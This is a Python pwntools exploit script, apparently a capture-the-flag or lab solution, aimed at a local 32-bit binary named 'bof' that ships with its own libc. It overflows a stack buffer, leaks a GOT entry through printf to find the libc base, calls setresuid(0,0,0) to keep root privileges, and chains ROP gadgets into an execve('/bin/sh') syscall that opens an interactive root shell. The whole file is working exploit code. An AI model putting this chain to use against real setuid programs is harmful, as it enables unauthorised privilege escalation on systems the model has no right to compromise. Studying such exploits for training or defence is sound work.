#!/usr/bin/python
from pwn import *
import os

offset = 524 
junk = "A" * offset
path = os.getcwd()          # Get current working directory

bin = path + "/bof"
elf = ELF(bin)
rop_elf = ROP(elf)

libc = path + "/libc-2.27.so"
libc_elf = ELF(libc)
rop_libc = ROP(libc_elf)

p = process(bin)

main_prog = p32(0x08048456)
printf_plt = elf.plt['printf']
gets_got = elf.got['gets']
push_esp = p32(0x08048371)  # 0x08048371 : push esp ; mov ebx, dword ptr [esp] ; ret  

log.info('printf@plt : ' + hex(printf_plt))
log.info('gets@got : ' + hex(gets_got))

# 1st stage
# printf("%s", *gets_got)
specifier = p32(0x804858b)

GAD_leak = ''
GAD_leak += p32(printf_plt)
GAD_leak += main_prog
GAD_leak += specifier
GAD_leak += p32(gets_got)

bof = ''
bof += junk
bof += GAD_leak

p.sendline(bof)

reply = p.recv().strip()
reply = reply[ -8 : -4]

gets = u32(reply)       # Unpack binary data to its hex equivalent
gets_offset = libc_elf.sym['gets']
libc_base = gets - gets_offset

print hexdump(reply)
log.success('gets() : ' + hex(gets))
log.success('gets() offset : ' + hex(gets_offset))
log.success('libc base : ' + hex(libc_base))

# 2nd stage
setresuid_offset = libc_elf.sym['setresuid']
setresuid = libc_base + setresuid_offset
log.success('setresuid() : ' + hex(setresuid))
log.success('setresuid() offset : ' + hex(setresuid_offset))

# setresuid(0,0,0)
GAD_RetainPriv = ''
GAD_RetainPriv += p32(setresuid)
GAD_RetainPriv += main_prog
GAD_RetainPriv += p32(0x0) * 3

bof = ''
bof += junk
bof += GAD_RetainPriv

p.sendline(bof)
log.warn('Looping the 1st time')
log.warn('Retaining root priv')

# 3rd stage
# 0x00024a67 : pop eax ; ret 
# 0x00193908 : pop ecx ; ret 
# 0x00002d37 : int 0x80
# 0x0007a4f3 : xor edx, edx ; pop ebx ; mov eax, edx ; pop esi ; pop edi ; ret
pop_eax = libc_base + 0x00024a67 
pop_ecx = libc_base + 0x00193908 
call_kernel = libc_base + 0x00002d37 
xor_edx = libc_base + 0x0007a4f3 

binSH_offset = next(libc_elf.search('/bin/sh\x00')) # Search for the offset containing string '/bin/sh\x00'
binSH = libc_base + binSH_offset

log.success('/bin/sh : ' + hex(binSH))
log.success('/bin/sh offset : ' + hex(binSH_offset))

log.success('pop eax : ' + hex(pop_eax))
log.success('pop ecx : ' + hex(pop_ecx))
log.success('int 80 : ' + hex(call_kernel))
log.success('xor edx, edx ; pop ebx ; mov eax, edx ; pop esi ; pop edi ; ret : ' + hex(xor_edx))

# execve('/bin/sh', NULL, NULL)
# 0x0007a4f3 : xor edx, edx ; pop ebx ; mov eax, edx ; pop esi ; pop edi ; ret
GAD_shell = ''
GAD_shell += p32(xor_edx)       # edx = 0x0
GAD_shell += p32(binSH)         # ebx = '/bin/sh' ; eax = 0x0
GAD_shell += p32(0x0)           # esi = 0x0 ; ignore
GAD_shell += p32(0x0)           # edi = 0x0 ; ignore

GAD_shell += p32(pop_eax)
GAD_shell += p32(0xB)           # eax = 0xB ; execve() syscall

GAD_shell += p32(pop_ecx)
GAD_shell += p32(0x0)           # ecx = 0x0 ; NULL

GAD_shell += p32(call_kernel)   # eax = 0xB, ebx = '/bin/sh', ecx = 0x0, edx = 0x0

bof = ''
bof += junk
bof += GAD_shell

#raw_input(str(p.proc.pid))      # For GDB

p.sendline(bof)
log.warn('Looping the 2nd time')
log.warn('Popping shell')

p.interactive()
